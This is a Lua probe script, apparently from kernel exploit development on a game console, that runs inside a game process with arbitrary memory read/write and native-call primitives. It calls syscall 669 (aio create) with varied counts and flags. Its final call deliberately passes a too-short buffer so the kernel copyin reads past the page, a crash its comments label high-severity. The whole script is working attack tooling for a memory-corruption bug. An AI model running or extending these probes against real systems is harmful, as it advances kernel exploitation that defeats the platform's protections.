-- CRASH_CLASS: HIGH
-- PROBE 531a: aio create with a correct-size buffer, then a short one
--
-- Context: 530a called create(count=0x7F) with a 0x200-byte descriptor page.
-- The kernel copyin wants count*0x28 = 0x13C8 bytes, so that call ran off the
-- page and the game process died. The 13.60 body allocates D = count*0x28,
-- then copyin(D, uap_buffer, count*0x28), then one 0x58 S (non-block) or
-- count*0x58 (flags 0x1000), then a 0x30 T and P = count*8.
--
-- This probe first repeats those shapes with a 0x3000 buffer so the copyin
-- is in bounds, then repeats count=0x7F with the short buffer LAST so the
-- failing path cannot hide the earlier results.

print("=== PROBE 531a: AIO COUNT / SHORT BUFFER ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local sc669 = mk(669)
local BIG = memory.alloc(0x3000)
local SHORT = memory.alloc(0x200)
local OUT = memory.alloc(0x40)
for i = 0, 0x2FFC, 4 do wd(BIG + i, 0x41414141) end
for i = 0, 0x1FC, 4 do wd(SHORT + i, 0x42424242) end

local pid_val = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
local function alive() return N(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) == pid_val end

local function run(tag, flags, count, buf)
    wd(N(OUT), 0)
    local ret = -999
    pcall(function()
        ret = N(sc669(uint64(flags), uint64(N(buf)), uint64(count), uint64(1), uint64(N(OUT))))
    end)
    print(string.format("%s flags=%X count=%X ret=%d out=%08X", tag, flags, count, ret, rd(N(OUT)) or 0))
    if not alive() then print("!! process gone"); return false end
    return true
end

if not run("[A]", 1, 0x7F, BIG) then return end
if not run("[B]", 1, 0x80, BIG) then return end
if not run("[C]", 0x1001, 0x7F, BIG) then return end
if not run("[D]", 0x1001, 0x80, BIG) then return end
if not run("[E]", 1, 1, BIG) then return end
-- non-block mode with more than one item has never been measured
if not run("[G]", 1, 4, BIG) then return end
-- last: the copyin runs past this page on purpose
run("[F]", 1, 0x7F, SHORT)
print("=== DONE ===")
